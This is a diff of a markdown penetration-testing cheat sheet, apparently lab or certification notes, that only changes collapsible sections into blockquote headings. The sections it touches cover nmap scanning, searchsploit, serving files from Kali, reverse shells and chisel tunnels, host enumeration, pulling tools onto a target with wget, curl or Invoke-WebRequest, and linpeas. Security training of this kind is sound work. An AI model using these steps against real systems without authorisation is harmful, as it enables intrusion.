@@ -41,7 +41,7 @@
 
 ## enumeration
 
-<details><summary><input type=checkbox> port scanning</summary>
+> <input type=checkbox> port scanning
 
 ```sh
 nmap -v $host | tee 00.nmap # fast initial scan.
@@ -49,10 +49,7 @@ nmap -A -v -sS -oA 01 -T4 $host
 nmap -A -v -sS -oA 02 -p- $host
 ```
 
-</details>
-
-<details>
-<summary><input type=checkbox> finding exploits</summary>
+> finding exploits
 
 * google
 * https://exploit-db.com
@@ -66,13 +63,11 @@ searchsploit motd # search exploits for message of the day.
 searchsploit -x 1235.c # look at specific exploit.
 ```
 
-</details>
-
 ## foothold and pivot
 
 ### kali
 
-<details> <summary><input type=checkbox> serving files</summary>
+> serving files
 
 ```sh
 # via webserver:
@@ -82,9 +77,7 @@ python3 -m http.server 80
 impacket-smbserver -smb2server share .
 ```
 
-</details>
-
-<details><summary><input type=checkbox> reverse shells and port bindings</summary>
+> reverse shells and port bindings
 
 ```sh
 # netcat
@@ -101,13 +94,9 @@ chisel server -v -p 12345 --reverse
 # plink
 ```
 
-</details>
-
-
 ### linux
 
-<details><summary><input type=checkbox> information gathering</summary>
-
+> information gathering
 
 ```sh
 uname -a # os info.
@@ -124,9 +113,7 @@ find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t | tee 
 dpkg -l # list of installed packages (and versions)
 ```
 
-</details>
-
-<details><summary><input type=checkbox> downloading files</summary>
+> downloading files
 
 * on Linux you should save your files to `/dev/shm` (the ramdisk)
   * type `mount | grep shm` to see that it is a tmpfs filesystem
@@ -141,20 +128,16 @@ wget $h/file
 curl $h/file -so file
 ```
 
-</details>
-
-<details><summary><input type=checkbox> info gathering with external tools</summary>
+> info gathering with external tools
 
 
 ```sh
 ./linpeas.sh -a
 ```
 
-</details>
-
 ### windows
 
-<details><summary><input type=checkbox> information gathering</summary>
+> information gathering
 
 ```sh
 dir /q
@@ -171,10 +154,7 @@ sc # stop/start service
 net start # old (from DOS)
 ```
 
-</details>
-
-<details><summary><input type=checkbox> downloading files</summary>
-
+> downloading files
 
 ```sh
 # powershell:
@@ -183,17 +163,12 @@ iwr hostname/file.exe -outf file.exe
 Invoke-WebRequest hostname/file.exe -OutFile file.exe
 ```
 
-</details>
-
-<details><summary><input type=checkbox> info gathering with external tools</summary>
-
+> info gathering with external tools
 
 ```sh
 linpeas.exe
 linpeas.bat # if exe fails.
 ```
-
-</details>
 
 ## privilege escalation
 
